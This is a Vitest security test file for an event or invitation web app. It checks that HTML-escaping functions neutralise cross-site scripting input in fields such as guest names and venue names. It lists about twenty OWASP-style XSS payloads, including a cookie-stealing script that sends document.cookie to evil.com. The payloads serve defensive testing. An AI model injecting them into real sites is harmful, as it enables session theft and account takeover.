// ABOUTME: Verifies XSS (Cross-Site Scripting) prevention through HTML escaping.
// ABOUTME: Tests against OWASP XSS filter evasion techniques.

import { describe, expect, it } from 'vitest';
import { escapeHtml } from '../../src/lib/pageStyles';
import { escapeHtml as escapeHtmlAlt } from '../../src/views/event/utils/escape';

describe('XSS prevention - basic HTML escaping', () => {
  it('escapes script tags', () => {
    const malicious = '<script>alert("xss")</script>';
    const escaped = escapeHtml(malicious);

    expect(escaped).not.toContain('<script');
    expect(escaped).not.toContain('</script>');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('escapes img tag with onerror', () => {
    const malicious = '<img src=x onerror=alert("xss")>';
    const escaped = escapeHtml(malicious);

    // Tag opening should be escaped
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');

    // The word "onerror" can appear, but not as executable HTML
    // What matters is < and > are escaped so no tag is created
    expect(escaped).toContain('&lt;');
    expect(escaped).toContain('&gt;');
  });

  it('escapes javascript: protocol', () => {
    const malicious = '<a href="javascript:alert(\'xss\')">click</a>';
    const escaped = escapeHtml(malicious);

    // Tags should be escaped, preventing execution
    expect(escaped).not.toContain('<a');
    expect(escaped).toContain('&lt;a');
    expect(escaped).toContain('&lt;/a&gt;');
  });

  it('escapes iframe tags', () => {
    const malicious = '<iframe src="javascript:alert(\'xss\')"></iframe>';
    const escaped = escapeHtml(malicious);

    expect(escaped).not.toContain('<iframe');
    expect(escaped).not.toContain('</iframe>');
    expect(escaped).toContain('&lt;iframe');
  });

  it('escapes svg with onload', () => {
    const malicious = '<svg/onload=alert("xss")>';
    const escaped = escapeHtml(malicious);

    // Tags should be escaped
    expect(escaped).not.toContain('<svg');
    expect(escaped).toContain('&lt;svg');
    expect(escaped).toContain('&gt;');
  });

  it('escapes body onload', () => {
    const malicious = '<body onload=alert("xss")>';
    const escaped = escapeHtml(malicious);

    // Tags should be escaped
    expect(escaped).not.toContain('<body');
    expect(escaped).toContain('&lt;body');
    expect(escaped).toContain('&gt;');
  });
});

describe('XSS prevention - OWASP evasion techniques', () => {
  const xssPayloads = [
    // Basic XSS
    '<script>alert("xss")</script>',

    // IMG with onerror
    '<img src=x onerror=alert("xss")>',

    // IMG with javascript protocol
    '<img src="javascript:alert(\'xss\')">',

    // IMG with mixed case
    '<IMG SRC=j&#X41vascript:alert("xss")>',

    // SVG XSS
    '<svg/onload=alert("xss")>',

    // Body onload
    '<body onload=alert("xss")>',

    // Input autofocus
    '<input onfocus=alert("xss") autofocus>',

    // Marquee onstart
    '<marquee onstart=alert("xss")>',

    // Double quote
    '"><script>alert(String.fromCharCode(88,83,83))</script>',

    // Math XSS
    '<math><mtext><style><img src=x onerror=alert("xss")>',

    // Style import
    '<style>@import"javascript:alert(\'xss\')";</style>',

    // Link stylesheet
    '<link rel="stylesheet" href="javascript:alert(\'xss\')">',

    // Meta refresh
    '<meta http-equiv="refresh" content="0;url=javascript:alert(\'xss\')">',

    // Object data
    '<object data="javascript:alert(\'xss\')">',

    // Embed src
    '<embed src="javascript:alert(\'xss\')">',

    // Table background
    '<table background="javascript:alert(\'xss\')">',

    // Div style
    '<div style="background:url(javascript:alert(\'xss\'))">',

    // A href
    '<a href="javascript:alert(\'xss\')">click</a>',

    // Form action
    '<form action="javascript:alert(\'xss\')"><input type="submit"></form>',

    // Button onclick
    '<button onclick="alert(\'xss\')">Click</button>',
  ];

  xssPayloads.forEach((payload, index) => {
    it(`escapes XSS payload #${index + 1}: ${payload.substring(0, 40)}...`, () => {
      const escaped = escapeHtml(payload);

      // Verify critical characters are escaped
      if (payload.includes('<')) {
        expect(escaped).toContain('&lt;');
      }
      if (payload.includes('>')) {
        expect(escaped).toContain('&gt;');
      }
      if (payload.includes('"')) {
        expect(escaped).toContain('&quot;');
      }
      if (payload.includes("'")) {
        expect(escaped).toContain('&#039;');
      }

      // Verify no actual HTML tags can be created
      expect(escaped).not.toContain('<script');
      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('<svg');
      expect(escaped).not.toContain('<iframe');
      expect(escaped).not.toContain('<body');
      expect(escaped).not.toContain('<a ');
      expect(escaped).not.toContain('<form');
      expect(escaped).not.toContain('<button');
      expect(escaped).not.toContain('<object');
      expect(escaped).not.toContain('<embed');
    });
  });
});

describe('XSS prevention - special characters', () => {
  it('escapes ampersand', () => {
    const text = 'M&M candies';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('M&amp;M candies');
  });

  it('escapes less than', () => {
    const text = '5 < 10';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('5 &lt; 10');
  });

  it('escapes greater than', () => {
    const text = '10 > 5';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('10 &gt; 5');
  });

  it('escapes double quotes', () => {
    const text = 'He said "hello"';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('He said &quot;hello&quot;');
  });

  it('escapes single quotes', () => {
    const text = "It's a test";
    const escaped = escapeHtml(text);

    expect(escaped).toBe('It&#039;s a test');
  });

  it('escapes all special characters together', () => {
    const text = `<tag attr="value">M&M's</tag>`;
    const escaped = escapeHtml(text);

    expect(escaped).toBe('&lt;tag attr=&quot;value&quot;&gt;M&amp;M&#039;s&lt;/tag&gt;');
  });
});

describe('XSS prevention - entities and unicode', () => {
  it('escapes numeric character references literally', () => {
    const payload = '&#x3C;script&#x3E;alert&#x28;1&#x29;';
    const escaped = escapeHtml(payload);

    expect(escaped).toBe('&amp;#x3C;script&amp;#x3E;alert&amp;#x28;1&amp;#x29;');
    expect(escaped).not.toContain('<');
    expect(escaped).not.toContain('>');
  });

  it('handles mixed unicode and already-escaped entities', () => {
    const payload = '招待状 &amp; fiesta 🎉 <span>¡Bienvenidos!</span>';
    const escaped = escapeHtml(payload);

    expect(escaped).toContain('招待状');
    expect(escaped).toContain('🎉');
    expect(escaped).toContain('&amp;amp;');
    expect(escaped).toContain('&lt;span&gt;¡Bienvenidos!&lt;/span&gt;');
  });

  it('remains safe when escaping output twice', () => {
    const payload = '<svg><script>alert("xss")</script></svg>';
    const firstPass = escapeHtml(payload);
    const secondPass = escapeHtml(firstPass);
    const altFirst = escapeHtmlAlt(payload);
    const altSecond = escapeHtmlAlt(altFirst);

    expect(firstPass).not.toContain('<script');
    expect(secondPass).not.toContain('<script');
    expect(secondPass).toContain('&amp;lt;svg&amp;gt;');
    expect(altSecond).not.toContain('<script');
    expect(secondPass.length).toBeGreaterThanOrEqual(firstPass.length);
  });

  it('escapes objects via toString without executing payloads', () => {
    const attacker = {
      toString: () => '<img src=x onerror=alert("xss")>'
    };

    const escapedPrimary = escapeHtml(attacker as unknown as string);
    const escapedAlt = escapeHtmlAlt(attacker as unknown as string);

    expect(escapedPrimary).toContain('&lt;img');
    expect(escapedPrimary).not.toContain('<img');
    expect(escapedAlt).toContain('&lt;img');
    expect(escapedAlt).not.toContain('<img');
  });
});

describe('XSS prevention - edge cases', () => {
  it('handles empty strings', () => {
    const escaped = escapeHtml('');
    expect(escaped).toBe('');
  });

  it('handles strings without special characters', () => {
    const text = 'Hello World 123';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('Hello World 123');
  });

  it('handles multiple consecutive special characters', () => {
    const text = '<<>><>>';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('&lt;&lt;&gt;&gt;&lt;&gt;&gt;');
  });

  it('handles numbers', () => {
    const text = '12345';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('12345');
  });

  it('handles mixed content', () => {
    const text = 'Price: $50 <span>Sale!</span> & save 20%';
    const escaped = escapeHtml(text);

    expect(escaped).toBe('Price: $50 &lt;span&gt;Sale!&lt;/span&gt; &amp; save 20%');
  });

  it('does not double-escape already escaped content', () => {
    const alreadyEscaped = '&lt;script&gt;';
    const escaped = escapeHtml(alreadyEscaped);

    // Should escape the ampersand
    expect(escaped).toBe('&amp;lt;script&amp;gt;');
  });
});

describe('XSS prevention - context-specific attacks', () => {
  it('prevents XSS in guest names', () => {
    const maliciousName = '<script>alert("xss")</script>';
    const escaped = escapeHtml(maliciousName);

    expect(escaped).not.toContain('<script');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('prevents XSS in event titles', () => {
    const maliciousTitle = 'Wedding <img src=x onerror=alert("xss")> Reception';
    const escaped = escapeHtml(maliciousTitle);

    // Tags should be escaped
    expect(escaped).not.toContain('<img');
    expect(escaped).toContain('&lt;img');
  });

  it('prevents XSS in venue names', () => {
    const maliciousVenue = 'The <svg/onload=alert("xss")> Hall';
    const escaped = escapeHtml(maliciousVenue);

    // Tags should be escaped
    expect(escaped).not.toContain('<svg');
    expect(escaped).toContain('&lt;svg');
  });

  it('prevents XSS in dietary notes', () => {
    const maliciousNotes = 'Vegetarian <script>fetch("/admin").then(r=>r.text()).then(d=>alert(d))</script>';
    const escaped = escapeHtml(maliciousNotes);

    // Script tags should be escaped
    expect(escaped).not.toContain('<script');
    expect(escaped).toContain('&lt;script&gt;');
  });

  it('prevents XSS in address fields', () => {
    const maliciousAddress = '123 Main St <iframe src="javascript:alert(\'xss\')"></iframe>';
    const escaped = escapeHtml(maliciousAddress);

    // Iframe tags should be escaped
    expect(escaped).not.toContain('<iframe');
    expect(escaped).toContain('&lt;iframe');
  });
});

describe('Alternative escape function consistency', () => {
  it('both escape functions produce same output', () => {
    const testCases = [
      '<script>alert("xss")</script>',
      'M&M candies',
      '5 < 10 > 3',
      'He said "hello"',
      "It's a test",
      '<tag attr="value">content</tag>',
    ];

    testCases.forEach(testCase => {
      const escaped1 = escapeHtml(testCase);
      const escaped2 = escapeHtmlAlt(testCase);

      expect(escaped1).toBe(escaped2);
    });
  });

  it('both handle null/undefined gracefully', () => {
    // pageStyles escapeHtml doesn't explicitly handle null/undefined
    // but the String() call will convert them

    // escapeHtmlAlt explicitly handles null/undefined
    expect(escapeHtmlAlt(null)).toBe('');
    expect(escapeHtmlAlt(undefined)).toBe('');
    expect(escapeHtmlAlt('')).toBe('');
  });
});

describe('Real-world XSS scenarios', () => {
  it('prevents stored XSS in guest profile', () => {
    const attackerProfile = {
      firstName: '<script>document.location="http://evil.com?cookie="+document.cookie</script>',
      lastName: 'Normal',
      email: 'attacker@example.com'
    };

    const escapedFirstName = escapeHtml(attackerProfile.firstName);

    // Script tags should be escaped
    expect(escapedFirstName).not.toContain('<script');
    expect(escapedFirstName).toContain('&lt;script&gt;');
  });

  it('prevents reflected XSS in error messages', () => {
    const maliciousInput = '<img src=x onerror=alert(document.domain)>';
    const errorMessage = `Invalid input: ${escapeHtml(maliciousInput)}`;

    // Image tags should be escaped
    expect(errorMessage).not.toContain('<img');
    expect(errorMessage).toContain('&lt;img');
  });

  it('prevents DOM-based XSS in dynamic content', () => {
    const userInput = '"><script>alert(String.fromCharCode(88,83,83))</script>';
    const safeOutput = `<div class="content">${escapeHtml(userInput)}</div>`;

    expect(safeOutput).not.toContain('<script>');
    expect(safeOutput).toContain('&quot;&gt;&lt;script&gt;');
  });
});
